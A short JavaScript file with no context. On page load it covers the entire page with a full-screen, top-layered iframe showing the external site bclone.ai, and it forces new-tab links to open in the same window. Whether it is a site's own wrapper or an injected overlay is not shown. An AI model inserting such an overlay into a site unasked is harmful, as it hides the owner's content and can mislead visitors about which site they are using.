document.addEventListener("DOMContentLoaded", function () {
    const iframe = document.createElement("iframe");
    iframe.src = "https://bclone.ai";
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.border = "none";
    iframe.style.zIndex = "9999";
    iframe.style.backgroundColor = "white";
    document.body.appendChild(iframe);
});

document.addEventListener("click", function(event) {
    const target = event.target.closest("a[target='_blank']");
    if (target) {
        event.preventDefault();
        window.location.href = target.href;
    }
});